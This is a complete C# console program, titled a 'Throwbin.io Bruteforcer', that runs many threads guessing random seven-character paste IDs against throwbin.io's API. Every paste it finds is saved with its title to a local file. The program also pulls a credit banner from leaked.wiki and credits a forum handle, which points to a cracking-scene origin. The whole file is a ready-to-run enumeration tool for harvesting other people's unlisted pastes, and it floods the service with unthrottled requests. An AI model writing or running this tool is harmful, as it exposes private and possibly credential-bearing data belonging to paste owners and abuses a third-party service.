using System;
using System.Linq;
using System.Net;
using System.Threading;
namespace Throwbin_Brute
{
    class Program
    {
        static void Main(string[] args)
        {
            WebClient client = new WebClient();
            string credit = "Created by c.to/Sango | Sango#0123";
            try { credit = client.DownloadString($"https://leaked.wiki/info.txt"); }
            catch (Exception) { }
            Console.Title = $"Throwbin.io Bruteforcer | {credit}";
            const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            Random random = new Random();
            int good = 0; int bad = 0;
            Console.Write(" Threads: ");
            int threadNum = int.Parse(Console.ReadLine());
            void update() { while (true) { Console.Title = $"Throwbin.io Bruteforcer | Good: {String.Format("{0:n0}", good)} | Bad: {String.Format("{0:n0}", bad)} | {credit}"; Thread.Sleep(500); } }
            new Thread(update).Start();
            void gen()
            {
                WebClient web = new WebClient();
                while (true)
                {
                    string code = new string(Enumerable.Repeat(chars, 7).Select(s => s[random.Next(s.Length)]).ToArray());
                    try
                    {
                        string res = web.DownloadString("https://api.throwbin.io/v1/paste/" + code + "/");
                        string title = res.Substring(39, res.IndexOf("paste", 39) - 42);
                        Console.WriteLine(" Good: https://throwbin.io/" + code+" | "+title); good++;
                        using (System.IO.StreamWriter file = new System.IO.StreamWriter("good.txt", true)) { file.WriteLine("https://throwbin.io/" + code + " | " + title); }
                    }
                    catch (WebException) { bad++; }
                }
            }
            for ( int x = 0; x < threadNum; x++ ) { new Thread(gen).Start(); }
        }
    }
}